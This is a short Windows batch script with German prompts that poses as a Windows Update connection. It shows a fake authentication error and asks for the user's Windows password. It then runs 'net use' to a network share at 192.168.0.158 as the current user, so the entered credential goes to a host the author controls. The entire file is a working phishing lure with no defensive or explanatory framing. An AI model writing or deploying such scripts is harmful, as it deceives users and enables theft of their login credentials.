@echo off
echo Windows-Update: Verbindung zu Microsoft Update-Server wird hergestellt...
timeout /t 3 >nul
echo Fehler: Manuelle Authentifizierung erforderlich!
echo Bitte geben Sie Ihr Windows-Passwort ein, um fortzufahren.
net use \\192.168.0.158\update /user:%username% /persistent:no
pause